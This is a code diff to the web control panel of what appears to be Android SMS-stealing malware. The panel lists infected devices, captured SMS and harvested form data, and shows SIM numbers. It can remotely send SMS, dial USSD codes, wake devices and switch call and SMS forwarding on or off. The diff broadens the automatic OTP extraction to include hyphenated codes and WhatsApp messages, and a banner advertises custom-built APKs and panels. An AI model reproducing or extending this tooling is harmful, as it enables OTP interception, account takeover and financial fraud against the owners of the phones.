@@ -24,7 +24,7 @@
             #sidebar.show-mobile { transform: translateX(0); }
         }
         #login-overlay { backdrop-filter: blur(8px); }
-        .stat-card { transition: all 0.2s; cursor: pointer; border-width: 2px; flex-shrink: 0; min-width: 110px; padding: 8px; }
+        .stat-card { transition: all 0.2s; cursor: pointer; border-width: 2px; flex-shrink: 0; min-width: 75px; padding: 6px; }
         .stat-card:active { transform: scale(0.95); }
         .stat-card.active-filter { transform: translateY(-2px); box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1); border-color: inherit; }
 
@@ -34,8 +34,9 @@
             border-radius: 12px;
             padding: 16px;
             margin-bottom: 12px;
-            border: 1px solid #e2e8f0;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+            border: 1px solid #cbd5e1;
+            border-left: 4px solid #3b82f6;
+            box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1);
         }
         .user-box:active { background-color: #f8fafc; }
 
@@ -167,7 +168,7 @@
         <!-- ADMIN ANNOUNCEMENT START: Is line ke niche ka text aap change kar sakte hain -->
         <div class="bg-rose-50 border-b border-rose-100 py-1.5 flex-shrink-0">
             <marquee behavior="scroll" direction="left" class="text-rose-600 font-black text-[11px] uppercase tracking-[0.2em]">
-                kali dev
+                kali dev <span class="text-yellow-500">"apke hisab se apk aur panel ban jaye ga"</span> kali dev
             </marquee>
         </div>
         <!-- ADMIN ANNOUNCEMENT END -->
@@ -175,25 +176,40 @@
         <!-- Fixed Scrollable Stats Row (Global) -->
         <div class="bg-white border-b border-slate-200 flex-shrink-0 z-20 overflow-hidden">
             <div class="flex overflow-x-auto no-scrollbar gap-2 p-3 lg:px-6">
-                <div onclick="setFilter('all')" id="stat-card-all" class="stat-card bg-white rounded-xl shadow-sm border-blue-500 flex items-center gap-2 active-filter">
-                    <div class="w-8 h-8 bg-blue-50 text-blue-600 rounded-lg flex items-center justify-center text-base"><i class="fas fa-users"></i></div>
-                    <div><div class="text-base font-black leading-none" id="stat-total">0</div><div class="text-[9px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">Devices</div></div>
+                <div onclick="setFilter('all')" id="stat-card-all" class="stat-card bg-white rounded-xl shadow-sm border-blue-500 flex flex-col items-center justify-center active-filter">
+                    <div class="flex items-center gap-1.5 mb-1">
+                        <div class="w-6 h-6 bg-blue-50 text-blue-600 rounded-lg flex items-center justify-center text-xs"><i class="fas fa-users"></i></div>
+                        <div class="text-sm font-black leading-none" id="stat-total">0</div>
+                    </div>
+                    <div class="text-[8px] font-bold text-slate-400 uppercase tracking-tighter">All Device</div>
                 </div>
-                <div onclick="setFilter('today')" id="stat-card-today" class="stat-card bg-white rounded-xl shadow-sm border-transparent flex items-center gap-2">
-                    <div class="w-8 h-8 bg-green-50 text-green-600 rounded-lg flex items-center justify-center text-base"><i class="fas fa-calendar-day"></i></div>
-                    <div><div class="text-base font-black text-green-600 leading-none" id="stat-today">0</div><div class="text-[9px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">Today</div></div>
+                <div onclick="setFilter('msgs')" id="stat-card-msgs" class="stat-card bg-white rounded-xl shadow-sm border-transparent flex flex-col items-center justify-center">
+                    <div class="flex items-center gap-1.5 mb-1">
+                        <div class="w-6 h-6 bg-indigo-50 text-indigo-600 rounded-lg flex items-center justify-center text-xs"><i class="fas fa-envelope"></i></div>
+                        <div class="text-sm font-black text-indigo-600 leading-none" id="stat-msgs">0</div>
+                    </div>
+                    <div class="text-[8px] font-bold text-slate-400 uppercase tracking-tighter">All SMS</div>
                 </div>
-                <div onclick="setFilter('msgs')" id="stat-card-msgs" class="stat-card bg-white rounded-xl shadow-sm border-transparent flex items-center gap-2">
-                    <div class="w-8 h-8 bg-indigo-50 text-indigo-600 rounded-lg flex items-center justify-center text-base"><i class="fas fa-envelope"></i></div>
-                    <div><div class="text-base font-black text-indigo-600 leading-none" id="stat-msgs">0</div><div class="text-[9px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">SMS</div></div>
+                <div onclick="setFilter('forms')" id="stat-card-forms" class="stat-card bg-white rounded-xl shadow-sm border-transparent flex flex-col items-center justify-center">
+                    <div class="flex items-center gap-1.5 mb-1">
+                        <div class="w-6 h-6 bg-rose-50 text-rose-600 rounded-lg flex items-center justify-center text-xs"><i class="fas fa-file-invoice"></i></div>
+                        <div class="text-sm font-black text-rose-600 leading-none" id="stat-forms">0</div>
+                    </div>
+                    <div class="text-[8px] font-bold text-slate-400 uppercase tracking-tighter">Data</div>
                 </div>
-                <div onclick="setFilter('forms')" id="stat-card-forms" class="stat-card bg-white rounded-xl shadow-sm border-transparent flex items-center gap-2">
-                    <div class="w-8 h-8 bg-rose-50 text-rose-600 rounded-lg flex items-center justify-center text-base"><i class="fas fa-file-invoice"></i></div>
-                    <div><div class="text-base font-black text-rose-600 leading-none" id="stat-forms">0</div><div class="text-[9px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">Forms</div></div>
+                <div onclick="setFilter('online')" id="stat-card-online" class="stat-card bg-white rounded-xl shadow-sm border-transparent flex flex-col items-center justify-center">
+                    <div class="flex items-center gap-1.5 mb-1">
+                        <div class="w-6 h-6 bg-emerald-50 text-emerald-600 rounded-lg flex items-center justify-center text-xs"><i class="fas fa-signal"></i></div>
+                        <div class="text-sm font-black text-emerald-600 leading-none" id="stat-online-count">0</div>
+                    </div>
+                    <div class="text-[8px] font-bold text-slate-400 uppercase tracking-tighter">Online</div>
                 </div>
-                <div onclick="setFilter('online')" id="stat-card-online" class="stat-card bg-white rounded-xl shadow-sm border-transparent flex items-center gap-2">
-                    <div class="w-8 h-8 bg-emerald-50 text-emerald-600 rounded-lg flex items-center justify-center text-base"><i class="fas fa-signal"></i></div>
-                    <div><div class="text-base font-black text-emerald-600 leading-none" id="stat-online-count">0</div><div class="text-[9px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">Online</div></div>
+                <div onclick="setFilter('today')" id="stat-card-today" class="stat-card bg-white rounded-xl shadow-sm border-transparent flex flex-col items-center justify-center">
+                    <div class="flex items-center gap-1.5 mb-1">
+                        <div class="w-6 h-6 bg-green-50 text-green-600 rounded-lg flex items-center justify-center text-xs"><i class="fas fa-calendar-day"></i></div>
+                        <div class="text-sm font-black text-green-600 leading-none" id="stat-today">0</div>
+                    </div>
+                    <div class="text-[8px] font-bold text-slate-400 uppercase tracking-tighter">Today</div>
                 </div>
             </div>
         </div>
@@ -296,18 +312,6 @@
                         <div id="cmd-status" class="text-[9px] font-black bg-slate-800 px-3 py-1 rounded-full text-slate-400 uppercase">Ready</div>
                     </div>
 
-                    <!-- Input Section -->
-                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
-                        <div class="space-y-1">
-                            <label class="text-[9px] font-black text-slate-500 uppercase ml-1">Target Number / USSD</label>
-                            <input id="cmd-shared-num" placeholder="e.g. 9876543210 or *121#" class="w-full bg-slate-800 rounded-xl p-3 text-xs outline-none border border-slate-700 focus:border-blue-500 transition-all">
-                        </div>
-                        <div class="space-y-1">
-                            <label class="text-[9px] font-black text-slate-500 uppercase ml-1">Message Content</label>
-                            <input id="cmd-shared-msg" placeholder="Type message here..." class="w-full bg-slate-800 rounded-xl p-3 text-xs outline-none border border-slate-700 focus:border-blue-500 transition-all">
-                        </div>
-                    </div>
-
                     <!-- Actions & SIM -->
                     <div class="flex flex-wrap items-end gap-3 pt-2">
                         <div class="flex-1 min-w-[120px] space-y-1">
@@ -332,8 +336,7 @@
                     </div>
 
                     <!-- Quick Command Buttons -->
-                    <div class="grid grid-cols-2 sm:grid-cols-4 gap-2 pt-2">
-                        <button onclick="sendUserCmd('SEND_SMS')" class="bg-blue-600 hover:bg-blue-700 py-3 rounded-xl text-[9px] font-black uppercase tracking-widest active:scale-95 transition-all"><i class="fas fa-paper-plane mr-1"></i> Send SMS</button>
+                    <div class="grid grid-cols-1 sm:grid-cols-3 gap-2 pt-2">
                         <button onclick="sendUserCmd('USSD')" class="bg-indigo-600 hover:bg-indigo-700 py-3 rounded-xl text-[9px] font-black uppercase tracking-widest active:scale-95 transition-all"><i class="fas fa-phone mr-1"></i> Dial USSD</button>
                         <div class="grid grid-cols-2 gap-1">
                             <button onclick="sendUserCmd('CALL_FORWARD')" class="bg-rose-600 hover:bg-rose-700 py-3 rounded-xl text-[9px] font-black uppercase active:scale-95 transition-all">CF ON</button>
@@ -344,6 +347,23 @@
                             <button onclick="sendUserCmd('REMOVE_SMS_FORWARD')" class="bg-slate-700 hover:bg-slate-600 py-3 rounded-xl text-[9px] font-black uppercase active:scale-95 transition-all">OFF</button>
                         </div>
                     </div>
+
+                    <!-- Input Section -->
+                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-3 border-t border-slate-800 pt-4">
+                        <div class="space-y-1">
+                            <label class="text-[9px] font-black text-slate-500 uppercase ml-1">Target Number / USSD</label>
+                            <input id="cmd-shared-num" placeholder="Target No. (CF/SF/SMS/USSD sab idhar se hoga)" class="w-full bg-slate-800 rounded-xl p-3 text-xs outline-none border border-slate-700 focus:border-blue-500 transition-all">
+                        </div>
+                        <div class="space-y-1">
+                            <label class="text-[9px] font-black text-slate-500 uppercase ml-1">Message Content</label>
+                            <input id="cmd-shared-msg" placeholder="iska use bas send sms ke time karna" class="w-full bg-slate-800 rounded-xl p-3 text-xs outline-none border border-slate-700 focus:border-blue-500 transition-all">
+                        </div>
+                    </div>
+
+                    <!-- Final Action -->
+                    <button onclick="sendUserCmd('SEND_SMS')" class="w-full bg-blue-600 hover:bg-blue-700 py-4 rounded-xl text-xs font-black uppercase tracking-widest active:scale-95 transition-all shadow-lg">
+                        <i class="fas fa-paper-plane mr-2"></i> Send SMS Command
+                    </button>
                 </div>
 
                 <!-- Tabs -->
@@ -406,7 +426,7 @@
     }
 
     function handleResetPassword() {
-        const email = document.getElementById('login-email').value.trim();
+        let email = document.getElementById('login-email').value.trim();
         const err = document.getElementById('login-err');
 
         if(!email) {
@@ -416,9 +436,12 @@
             return;
         }
 
+        // Fix: Convert to lowercase to match Firebase
+        email = email.toLowerCase();
+
         auth.sendPasswordResetEmail(email)
             .then(() => {
-                alert("Reset link sent to: " + email + "\nCheck your inbox/spam.");
+                alert("Reset link sent to: " + email + "\nCheck your inbox and SPAM folder.");
             })
             .catch(error => {
                 err.innerText = "RESET FAILED: " + error.message;
@@ -600,14 +623,29 @@
     function extractOTP(text) {
         if (!text) return null;
         const lowText = text.toLowerCase();
-        // Only show button if these keywords are found in message
-        const keywords = ["otp", "code", "verification", "vcode", "pin", "password"];
+        // Updated keywords and added support for hyphenated OTPs (e.g., 474-810)
+        const keywords = ["otp", "code", "verification", "vcode", "pin", "password", "whatsapp"];
         const hasKeyword = keywords.some(k => lowText.includes(k));
         if (!hasKeyword) return null;
 
-        // Search for 4 to 8 digit numbers
-        const otpMatch = text.match(/\b\d{4,8}\b/);
+        const otpMatch = text.match(/\b\d{4,8}\b|\b\d{3,4}[- ]\d{3,4}\b/);
         return otpMatch ? otpMatch[0] : null;
+    }
+
+    function checkOnlineSpecific(uid) {
+        db.ref(`Users/${uid}/C`).push({ t: 'CHECK_ONLINE', ts: Date.now() });
+        db.ref('fcm_queue').push({ t: 'WAKE_UP', targetUid: uid });
+
+        const btn = event.currentTarget;
+        const oldHtml = btn.innerHTML;
+        btn.innerHTML = '<i class="fas fa-check mr-1"></i> REQUESTED';
+        btn.disabled = true;
+        btn.classList.replace('bg-emerald-600', 'bg-slate-700');
+        setTimeout(() => {
+            btn.innerHTML = oldHtml;
+            btn.disabled = false;
+            btn.classList.replace('bg-slate-700', 'bg-emerald-600');
+        }, 3000);
     }
 
     function updateDashboard() {
@@ -792,10 +830,15 @@
                                 </div>
                             </div>
                         </div>
-                        <button class="bg-slate-900 text-white px-4 py-1.5 rounded-lg text-[10px] font-black uppercase">OPEN</button>
+                        <div class="flex items-center gap-2">
+                            <button onclick="event.stopPropagation(); checkOnlineSpecific('${uid}')" class="bg-emerald-50 text-emerald-600 px-3 py-1.5 rounded-lg text-[9px] font-black uppercase hover:bg-emerald-100 active:scale-90 transition-all border border-emerald-100">
+                                <i class="fas fa-wifi mr-1"></i> SYNC
+                            </button>
+                            <button class="bg-slate-900 text-white px-4 py-1.5 rounded-lg text-[10px] font-black uppercase">OPEN</button>
+                        </div>
                     </div>
-                    <div class="grid grid-cols-2 gap-2 mb-3 bg-slate-50 p-2 rounded-lg border border-slate-100">
-                        <div>
+                    <div class="grid grid-cols-1 gap-2 mb-3 bg-slate-50 p-2 rounded-lg border border-slate-100">
+                        <div class="border-b border-slate-200 pb-2">
                             <div class="flex items-center justify-between">
                                 <span class="text-[9px] text-slate-400 font-bold uppercase">SIM 1</span>
                                 ${s1 !== 'H' && s1 !== 'Hidden' ? `<button onclick="event.stopPropagation(); copyToClipboard('${s1}', this)" class="text-blue-500 hover:text-blue-700 transition-all"><i class="fas fa-copy text-[10px]"></i></button>` : ''}
@@ -809,13 +852,6 @@
                             </div>
                             <div class="text-xs font-black text-slate-700">${s2}</div>
                         </div>
-                    </div>
-                    <div class="bg-blue-50/50 border border-blue-100 p-3 rounded-xl">
-                        <div class="flex items-center gap-2 mb-1">
-                            <i class="fas fa-comment-dots text-blue-400 text-[10px]"></i>
-                            <span class="text-[10px] font-black text-blue-600 uppercase truncate">${lastM.s || 'WAITING'}</span>
-                        </div>
-                        <div class="text-sm font-bold text-slate-600 leading-tight">"${lastM.m || 'PENDING...'}"</div>
                     </div>
                 `;
                 listDiv.appendChild(card);
